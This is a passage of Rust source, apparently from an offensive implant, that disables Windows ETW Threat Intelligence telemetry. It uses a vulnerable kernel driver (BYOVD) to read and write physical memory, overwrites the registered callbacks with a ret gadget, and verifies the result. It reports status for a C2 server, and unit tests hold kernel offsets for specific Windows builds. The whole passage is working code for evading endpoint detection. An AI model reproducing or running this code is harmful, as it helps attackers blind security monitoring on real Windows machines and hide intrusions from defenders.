        unsafe { deploy::write_physical_memory(driver, device_handle, kernel_addr, data).is_ok() }
    }
}

/// Verify that all ETW-Ti callbacks are currently disabled (pointing to ret).
///
/// Returns `true` if all non-NULL callbacks point to the ret gadget or if
/// no callbacks are registered.
pub fn verify_etw_ti_disabled() -> Result<bool> {
    let deployed = deploy::get_deployed_driver().context(
        "no BYOVD driver deployed — cannot verify ETW-Ti state",
    )?;
    let driver = deployed.driver;
    let device_handle = deployed
        .device_handle
        .context("no device handle for deployed driver")?;

    let kernel_base = discover::get_kernel_base()?;
    let cr3 = if driver.needs_physical_addr {
        crate::kernel_callback::resolve_cr3(driver, device_handle, kernel_base)?
    } else {
        0
    };

    let build = crate::syscalls::get_build_number();
    let callback_offset = match etw_reg_entry_callback_offset_for_build(build) {
        Some(off) => off,
        None => bail!("build {} not in callback offset table", build),
    };

    let table_addr = resolve_etw_ti_table(driver, device_handle, kernel_base, cr3, build)?;

    // Determine what the ret address should be by looking at the first backup.
    let ret_address = {
        let guard = BACKUPS.lock().unwrap();
        guard.first().map(|b| b.ret_address).unwrap_or(0)
    };

    if ret_address == 0 {
        // No backups — either never bypassed or already restored.
        // Check if there are any non-zero callbacks.
        log::debug!("etw_ti_bypass: no backups found — ETW-Ti may not have been disabled");
        return Ok(false);
    }

    let mut all_disabled = true;

    for (i, &provider) in EtwTiProvider::all().iter().enumerate() {
        let entry_ptr_addr = table_addr + (i as u64) * 8;
        let reg_entry_ptr = match kernel_read_u64(driver, device_handle, cr3, entry_ptr_addr) {
            Some(v) => v,
            None => continue,
        };

        if reg_entry_ptr == 0 {
            continue;
        }

        let callbacks = walk_provider_callbacks(
            driver,
            device_handle,
            cr3,
            reg_entry_ptr,
            callback_offset,
            16,
        );

        for (_, callback_value) in &callbacks {
            if *callback_value != 0 && *callback_value != ret_address {
                all_disabled = false;
                log::warn!(
                    "etw_ti_bypass: {} callback 0x{:016X} is NOT disabled",
                    provider,
                    callback_value
                );
            }
        }
    }

    if all_disabled {
        log::info!("etw_ti_bypass: verification passed — all ETW-Ti callbacks disabled");
    }

    Ok(all_disabled)
}

/// Get the current status of the ETW-Ti bypass subsystem.
///
/// Useful for reporting back to the C2 server.
pub fn etw_ti_status() -> EtwTiStatus {
    let build = crate::syscalls::get_build_number();
    let build_supported = etw_ti_table_offset_for_build(build).is_some()
        || etw_ti_absolute_offset_for_build(build).is_some();

    let backups = BACKUPS.lock().unwrap();
    let callbacks_overwritten = backups.len();
    let disabled = callbacks_overwritten > 0;

    let mut providers = Vec::new();
    for &provider in EtwTiProvider::all() {
        let provider_backups: Vec<_> = backups.iter().filter(|b| b.provider == provider).collect();
        providers.push(EtwTiProviderStatus {
            provider,
            disabled: !provider_backups.is_empty(),
            callback_count: provider_backups.len(),
            overwritten_count: provider_backups.len(),
        });
    }

    EtwTiStatus {
        disabled,
        providers_targeted: EtwTiProvider::all().len(),
        callbacks_overwritten,
        build,
        build_supported,
        providers,
    }
}

// ─── Unit Tests ───────────────────────────────────────────────────────────

#[cfg(test)]
mod tests {
    use super::*;

    #[test]
    fn test_provider_all_count() {
        assert_eq!(EtwTiProvider::all().len(), 6);
    }

    #[test]
    fn test_provider_names() {
        assert_eq!(EtwTiProvider::ProcessCreate.name(), "EtwTiProcessCreate");
        assert_eq!(EtwTiProvider::ImageLoad.name(), "EtwTiImageLoad");
        assert_eq!(EtwTiProvider::ThreadCreate.name(), "EtwTiThreadCreate");
        assert_eq!(EtwTiProvider::Registry.name(), "EtwTiRegistry");
        assert_eq!(EtwTiProvider::FileIO.name(), "EtwTiFileIO");
        assert_eq!(EtwTiProvider::Network.name(), "EtwTiNetwork");
    }

    #[test]
    fn test_offset_lookup_known_builds() {
        // Windows 10 19041 (2004)
        assert_eq!(etw_ti_table_offset_for_build(19041), Some(0x80));
        assert_eq!(etw_reg_entry_callback_offset_for_build(19041), Some(0x28));

        // Windows 11 22000
        assert_eq!(etw_ti_table_offset_for_build(22000), Some(0x88));
        assert_eq!(etw_reg_entry_callback_offset_for_build(22000), Some(0x30));

        // Windows 11 26100 (24H2)
        assert_eq!(etw_ti_table_offset_for_build(26100), Some(0x90));
        assert_eq!(etw_reg_entry_callback_offset_for_build(26100), Some(0x38));
    }

    #[test]
    fn test_offset_lookup_forward_compat() {
        // A build between known entries should use the last lower entry.
        // Build 22622 is between 22621 and 22631, should get 22621's value.
        assert_eq!(etw_ti_table_offset_for_build(22622), Some(0x88));

        // A build higher than the highest known should get the highest entry.
        assert_eq!(etw_ti_table_offset_for_build(26200), Some(0x90));
    }

    #[test]
    fn test_offset_lookup_unknown_old_build() {
        // Build 15063 (Windows 10 1703, before ETW-Ti) should return None.
        assert_eq!(etw_ti_table_offset_for_build(15063), None);
    }

    #[test]
    fn test_absolute_offset_fallback() {
        // Absolute offsets should be available for all known builds.
        assert!(etw_ti_absolute_offset_for_build(19041).is_some());
        assert!(etw_ti_absolute_offset_for_build(26100).is_some());
    }

    #[test]
    fn test_backup_storage() {
        // Verify that the backup storage starts empty.
        {
            let guard = BACKUPS.lock().unwrap();
            assert!(guard.is_empty());
        }
    }

    #[test]
    fn test_status_initial() {
        let status = etw_ti_status();
        assert!(!status.disabled);
        assert_eq!(status.callbacks_overwritten, 0);
        assert_eq!(status.providers.len(), 6);
    }

    #[test]
    fn test_provider_display() {
        assert_eq!(format!("{}", EtwTiProvider::ProcessCreate), "EtwTiProcessCreate");
        assert_eq!(format!("{}", EtwTiProvider::Network), "EtwTiNetwork");
    }
}
